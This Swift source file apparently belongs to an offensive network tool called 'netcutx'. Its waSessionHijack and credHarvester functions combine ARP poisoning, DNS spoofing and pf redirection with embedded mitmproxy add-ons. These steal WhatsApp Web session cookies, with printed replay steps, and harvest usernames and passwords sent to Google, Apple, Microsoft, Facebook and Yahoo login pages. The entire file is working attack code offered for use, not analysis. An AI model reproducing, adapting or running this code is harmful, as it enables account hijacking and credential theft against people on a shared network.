import Foundation

private let addonDir = "/tmp/netcutx_addons"
private let cookieFile = "/tmp/netcutx_wa_session.txt"
private let credFile = "/tmp/netcutx_creds.txt"
private let logFile = "/tmp/netcutx_extract.log"

private let waAddonScript = """
import datetime, os

COOKIE_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'netcutx_wa_session.txt')
LOG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'netcutx_extract.log')

def log(msg):
    with open(LOG_FILE, 'a') as f:
        f.write(f'[{datetime.datetime.now()}] {msg}\\n')

def response(flow):
    host = flow.request.pretty_host
    if 'web.whatsapp.com' in host:
        for h, v in flow.response.headers.items():
            if h.lower() == 'set-cookie':
                log(f'Set-Cookie: {v}')
                print(f'[NETCUTX] Cookie: {v}')
                if 'wa_session' in v.lower() or '__wa_session' in v.lower():
                    with open(COOKIE_FILE, 'w') as f:
                        f.write(v)
                    print(f'[NETCUTX] WA SESSION CAPTURED! Replay cookie: {v}')
                    log(f'SESSION CAPTURED: {v}')
"""

private let credAddonScript = """
import datetime, os

CRED_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'netcutx_creds.txt')
LOG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'netcutx_extract.log')

LOGIN_DOMAINS = ['accounts.google.com', 'appleid.apple.com', 'login.live.com',
                 'login.yahoo.com', 'id.facebook.com', 'login.microsoftonline.com']

def log(msg):
    with open(LOG_FILE, 'a') as f:
        f.write(f'[{datetime.datetime.now()}] {msg}\\n')

def request(flow):
    host = flow.request.pretty_host
    if not any(d in host for d in LOGIN_DOMAINS):
        return
    if flow.request.method != 'POST':
        return
    form = flow.request.urlencoded_form or {}
    sensitive = {}
    for k, v in form.items():
        kl = k.lower()
        if any(x in kl for x in ['email', 'pass', 'user', 'login', 'account', 'cred']):
            sensitive[k] = v
    if sensitive:
        with open(CRED_FILE, 'a') as f:
            f.write(f'[{datetime.datetime.now()}] {host}{flow.request.path}\\n')
            for k, v in sensitive.items():
                f.write(f'  {k}={v}\\n')
            f.write('-' * 40 + '\\n')
        log(f'Credentials captured from {host}')
        print(f'[NETCUTX] Credentials: {host} {list(sensitive.keys())}')
"""

private func writeAddon(_ name: String, _ content: String) -> String? {
    try? FileManager.default.createDirectory(atPath: addonDir, withIntermediateDirectories: true)
    let path = "\(addonDir)/\(name).py"
    do {
        try content.write(toFile: path, atomically: true, encoding: .utf8)
        return path
    } catch {
        return nil
    }
}

private func runMitmproxy(port: Int, addonPath: String) -> Process? {
    let paths = ["/opt/homebrew/bin/mitmproxy", "/usr/local/bin/mitmproxy", "/usr/bin/mitmproxy"]
    let proxyPath = paths.first { FileManager.default.fileExists(atPath: $0) } ?? "/opt/homebrew/bin/mitmproxy"
    let proxy = Process()
    proxy.executableURL = URL(fileURLWithPath: proxyPath)
    proxy.arguments = [
        "-p", "\(port)",
        "--set", "block_global=false",
        "--set", "ssl_insecure=true",
        "-s", addonPath,
        "--set", "http2=false"
    ]
    proxy.standardOutput = FileHandle.nullDevice
    proxy.standardError = FileHandle.nullDevice
    do {
        try proxy.run()
        return proxy
    } catch {
        return nil
    }
}

private func cleanupExtraction(proxy: Process?, bpf: NetcutxBPF?,
                                configs: [SpooferConfig], gwMAC: MACAddr, gw: String) {
    if let p = proxy, p.isRunning {
        p.terminate()
        p.waitUntilExit()
    }
    if let b = bpf {
        for cfg in configs {
            for _ in 0..<3 {
                try? b.send(frame: Data(ARPFrame.buildReply(
                    srcMAC: gwMAC, srcIP: gw, dstMAC: cfg.victimMAC, dstIP: cfg.victimIP).bytes))
                Thread.sleep(forTimeInterval: 0.05)
            }
        }
        b.close()
    }
    _ = pfctl(["-a", "netcutx", "-F", "all"])

    if FileManager.default.fileExists(atPath: cookieFile) {
        print("")
        ok("WA session cookie saved: \(cookieFile)")
        ok("Open browser → DevTools → Application → Cookies")
        ok("Add cookie to web.whatsapp.com → refresh")
    }
    if FileManager.default.fileExists(atPath: credFile) {
        if let credData = try? String(contentsOfFile: credFile) {
            print("")
            ok("Credentials saved: \(credFile)")
            print(credData)
        }
    }
}

func waSessionHijack(targetIP: String, interface: String? = nil) {
    guard getuid() == 0 else { fail("Requires sudo"); return }

    let ifname: String
    if let provided = interface { ifname = provided }
    else if let detected = getDefaultInterface() { ifname = detected }
    else { fail("No interface detected"); return }

    guard let ourIP = getInterfaceIP(ifname) else { fail("Cannot detect IP"); return }
    guard let ourMAC = getInterfaceMAC(ifname) else { fail("Cannot detect MAC"); return }

    let proxyPort = 8080

    ok("Interface \(ifname) — \(ourIP)")
    status("Setting up MITM + DNS spoof + HTTP redirect...")

    let bpf: NetcutxBPF
    do { bpf = try NetcutxBPF(interface: ifname) } catch {
        fail("BPF: \(error.localizedDescription)"); return
    }

    guard let gw = getGatewayIP() else { bpf.close(); fail("Cannot detect gateway"); return }
    guard let gwMAC = try? resolveMAC(bpf: bpf, ourMAC: ourMAC, ourIP: ourIP, targetIP: gw) else {
        bpf.close(); fail("Cannot resolve gateway MAC"); return
    }
    guard let targetMAC = try? resolveMAC(bpf: bpf, ourMAC: ourMAC, ourIP: ourIP, targetIP: targetIP) else {
        bpf.close(); fail("Cannot resolve target MAC"); return
    }

    ok("Gateway \(gw)")
    ok("Target \(targetIP) = \(macToString(targetMAC))")

    // Write mitmproxy addon
    guard let addonPath = writeAddon("wa_hijack", waAddonScript) else {
        bpf.close(); fail("Failed to write addon script"); return
    }
    status("mitmproxy addon: \(addonPath)")

    // Start mitmproxy
    status("Launching mitmproxy on port \(proxyPort)...")
    guard let proxy = runMitmproxy(port: proxyPort, addonPath: addonPath) else {
        bpf.close()
        fail("mitmproxy not found. Install: brew install mitmproxy")
        return
    }
    ok("mitmproxy PID \(proxy.processIdentifier)")

    // Set up pf redirect
    _ = pfctl(["-e"])
    let anchorRules = "rdr pass on \(ifname) inet proto tcp from \(targetIP) to any port 443 -> 127.0.0.1 port \(proxyPort)\nrdr pass on \(ifname) inet proto tcp from \(targetIP) to any port 80 -> 127.0.0.1 port \(proxyPort)\n"
    try? anchorRules.write(toFile: "/tmp/netcutx_anchor.conf", atomically: true, encoding: .utf8)
    let (rc, _) = pfctl(["-a", "netcutx", "-f", "/tmp/netcutx_anchor.conf"])
    if !rc { fail("pf anchor failed"); cleanupExtraction(proxy: proxy, bpf: bpf, configs: [], gwMAC: gwMAC, gw: gw); return }
    ok("HTTP/HTTPS → 127.0.0.1:\(proxyPort)")

    // Start spoof + DNS interleaved
    let cfg = SpooferConfig(interface: ifname, victimIP: targetIP, gatewayIP: gw,
                            ourMAC: ourMAC, ourIP: ourIP, victimMAC: targetMAC, gatewayMAC: gwMAC,
                            interval: 0.3, bidirectional: true, forwardTraffic: true)
    setupSignal()
    _ = setIPForwarding(true)

    var dnsSinceSend = 0
    let dnsRules = [DNSRule(domain: "web.whatsapp.com", fakeIP: ourIP)]

    print("")
    print("  ── Active Extraction ──")
    status("Waiting for target to open web.whatsapp.com...")
    status("Cookie will be saved to: \(cookieFile)")
    print("  Press Ctrl+C to stop")
    print("")

    while _stopFlag == 0 {
        if dnsSinceSend >= 10 {
            try? bpf.send(frame: Data(ARPFrame.buildReply(
                srcMAC: ourMAC, srcIP: gw, dstMAC: targetMAC, dstIP: targetIP).bytes))
            try? bpf.send(frame: Data(ARPFrame.buildBroadcastSpoof(
                srcMAC: ourMAC, srcIP: gw, victimMAC: targetMAC, victimIP: targetIP).bytes))
            try? bpf.send(frame: Data(ARPFrame.buildAPPoison(
                srcMAC: ourMAC, srcIP: targetIP, targetMAC: gwMAC, targetIP: gw).bytes))
            try? bpf.send(frame: Data(ARPFrame.buildBroadcastSpoof(
                srcMAC: ourMAC, srcIP: targetIP, victimMAC: gwMAC, victimIP: gw).bytes))
            dnsSinceSend = 0
        }

        guard let pkt = try? bpf.receive(timeout: 0.05) else { dnsSinceSend += 1; continue }
        guard let frame = extractDNSFrame(pkt.data) else { dnsSinceSend += 1; continue }

        if frame.dstPort == 53 && frame.srcIP == targetIP {
            if let query = parseDNSQuery(from: frame.dnsPayload) {
                for rule in dnsRules {
                    if query.domain == rule.domain || query.domain.hasSuffix(".\(rule.domain)") {
                        let resp = buildDNSResponse(id: query.id, domain: query.domain, fakeIP: rule.fakeIP)
                        if let respFrame = buildDNSResponseFrame(ourMAC: ourMAC, targetMAC: targetMAC,
                                                                 dnsServerIP: frame.dstIP, targetIP: targetIP,
                                                                 queryPort: frame.srcPort, dnsResponse: resp) {
                            try? bpf.send(frame: respFrame)
                            statusErr("[DNS] \(query.domain) → \(rule.fakeIP)")
                        }
                        break
                    }
                }
            }
        }

        // Check for captured cookie
        if FileManager.default.fileExists(atPath: cookieFile),
           let cookieVal = try? String(contentsOfFile: cookieFile), !cookieVal.isEmpty {
            print("")
            ok("WA SESSION CAPTURED!")
            print("")
            print("  Cookie: \(cookieVal)")
            print("  File:   \(cookieFile)")
            print("")
            print("  Replay:")
            print("    1. Open browser → DevTools (F12)")
            print("    2. Application → Cookies → web.whatsapp.com")
            print("    3. Add cookie key=value from above")
            print("    4. Refresh web.whatsapp.com")
            print("")
            break
        }

        dnsSinceSend += 1
    }

    _ = setIPForwarding(false)
    let configs = [cfg]
    cleanupExtraction(proxy: proxy, bpf: bpf, configs: configs, gwMAC: gwMAC, gw: gw)
}

func credHarvester(targetIP: String, interface: String? = nil) {
    guard getuid() == 0 else { fail("Requires sudo"); return }

    let ifname: String
    if let provided = interface { ifname = provided }
    else if let detected = getDefaultInterface() { ifname = detected }
    else { fail("No interface detected"); return }

    guard let ourIP = getInterfaceIP(ifname) else { fail("Cannot detect IP"); return }
    guard let ourMAC = getInterfaceMAC(ifname) else { fail("Cannot detect MAC"); return }

    let proxyPort = 8080

    ok("Interface \(ifname) — \(ourIP)")
    status("Setting up MITM + HTTP redirect + credential harvester...")

    let bpf: NetcutxBPF
    do { bpf = try NetcutxBPF(interface: ifname) } catch {
        fail("BPF: \(error.localizedDescription)"); return
    }

    guard let gw = getGatewayIP() else { bpf.close(); fail("Cannot detect gateway"); return }
    guard let gwMAC = try? resolveMAC(bpf: bpf, ourMAC: ourMAC, ourIP: ourIP, targetIP: gw) else {
        bpf.close(); fail("Cannot resolve gateway MAC"); return
    }
    guard let targetMAC = try? resolveMAC(bpf: bpf, ourMAC: ourMAC, ourIP: ourIP, targetIP: targetIP) else {
        bpf.close(); fail("Cannot resolve target MAC"); return
    }

    ok("Gateway \(gw)")
    ok("Target \(targetIP)")

    guard let addonPath = writeAddon("cred_harvest", credAddonScript) else {
        bpf.close(); fail("Failed to write addon"); return
    }
    status("mitmproxy addon: \(addonPath)")

    guard let proxy = runMitmproxy(port: proxyPort, addonPath: addonPath) else {
        bpf.close()
        fail("mitmproxy not found. Install: brew install mitmproxy")
        return
    }
    ok("mitmproxy PID \(proxy.processIdentifier)")

    _ = pfctl(["-e"])
    let anchorRules = "rdr pass on \(ifname) inet proto tcp from \(targetIP) to any port 443 -> 127.0.0.1 port \(proxyPort)\nrdr pass on \(ifname) inet proto tcp from \(targetIP) to any port 80 -> 127.0.0.1 port \(proxyPort)\n"
    try? anchorRules.write(toFile: "/tmp/netcutx_anchor.conf", atomically: true, encoding: .utf8)
    let (rc, _) = pfctl(["-a", "netcutx", "-f", "/tmp/netcutx_anchor.conf"])
    if !rc { fail("pf anchor failed"); cleanupExtraction(proxy: proxy, bpf: bpf, configs: [], gwMAC: gwMAC, gw: gw); return }
    ok("HTTP/HTTPS → 127.0.0.1:\(proxyPort)")

    let cfg = SpooferConfig(interface: ifname, victimIP: targetIP, gatewayIP: gw,
                            ourMAC: ourMAC, ourIP: ourIP, victimMAC: targetMAC, gatewayMAC: gwMAC,
                            interval: 0.3, bidirectional: true, forwardTraffic: true)
    setupSignal()
    _ = setIPForwarding(true)

    var dnsSinceSend = 0
    print("")
    print("  ── Credential Harvester ──")
    status("Monitoring: Google, Apple, Microsoft, Facebook, Yahoo logins")
    status("Credentials saved to: \(credFile)")
    print("  Press Ctrl+C to stop")
    print("")

    while _stopFlag == 0 {
        if dnsSinceSend >= 10 {
            try? bpf.send(frame: Data(ARPFrame.buildReply(
                srcMAC: ourMAC, srcIP: gw, dstMAC: targetMAC, dstIP: targetIP).bytes))
            try? bpf.send(frame: Data(ARPFrame.buildBroadcastSpoof(
                srcMAC: ourMAC, srcIP: gw, victimMAC: targetMAC, victimIP: targetIP).bytes))
            try? bpf.send(frame: Data(ARPFrame.buildAPPoison(
                srcMAC: ourMAC, srcIP: targetIP, targetMAC: gwMAC, targetIP: gw).bytes))
            try? bpf.send(frame: Data(ARPFrame.buildBroadcastSpoof(
                srcMAC: ourMAC, srcIP: targetIP, victimMAC: gwMAC, victimIP: gw).bytes))
            dnsSinceSend = 0
        }

        guard let pkt = try? bpf.receive(timeout: 0.05) else { dnsSinceSend += 1; continue }
        _ = parseIPPacket(pkt.data, targetFilter: targetIP)
        dnsSinceSend += 1

        if FileManager.default.fileExists(atPath: credFile),
           let data = try? String(contentsOfFile: credFile), !data.isEmpty {
            let lines = data.components(separatedBy: "\n").filter { !$0.isEmpty }
            let lastLine = lines.last ?? ""
            if lastLine.contains("@") || lastLine.lowercased().contains("pass") {
                print("")
                ok("Credentials detected!")
                print(data)
            }
        }
    }

    _ = setIPForwarding(false)
    let configs = [cfg]
    cleanupExtraction(proxy: proxy, bpf: bpf, configs: configs, gwMAC: gwMAC, gw: gw)
}
